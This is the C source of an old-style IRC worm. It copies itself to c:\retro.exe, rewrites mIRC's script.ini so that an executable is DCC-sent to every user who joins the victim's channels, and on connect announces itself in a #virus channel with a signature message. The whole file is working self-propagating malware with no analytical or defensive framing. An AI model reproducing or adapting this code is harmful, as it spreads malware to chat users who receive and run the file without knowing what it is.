#include <stdio.h>
#include <string.h>

short WormCopy(char SRCFileName[], char DSTFileName[])
{
	FILE *SRC, *DST;
	char Buffer[1024];
	short Counter = 0;
	short Status = 0;
	SRC = fopen(SRCFileName, "rb");
	if(SRC)
	{
		DST = fopen(DSTFileName, "wb");
		if(DST)
		{
			while(! feof(SRC))
			{
				Counter = fread(Buffer, 1, 1024, SRC);
				if(Counter)
				fwrite(Buffer, 1, Counter, DST);
			}
		Status = 1;
		}
	}
	fclose(SRC);
	fclose(DST);
	return Status;
}


void main(int argc, char **argv)
{

	FILE *retro;

	char ProgName[100];
	strcpy(ProgName, argv[0]);
	WormCopy(ProgName, "c:\\retro.exe");

	retro = fopen("c:\\mirc\\script.ini","wt");
	if(retro)
	{
		fprintf(retro,"[script]\nn0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }\nn1=/dcc send $nick");
    	fprintf(retro," c:/BTVS.exe\nn2=}\n");
		fprintf(retro,"n3=ON 1:CONNECT:/join #virus | /timer5 1 2 /msg #virus I am less then shy! - Retro | /timer4 1 5 /part #virus");
	}
   	fclose(retro);


}


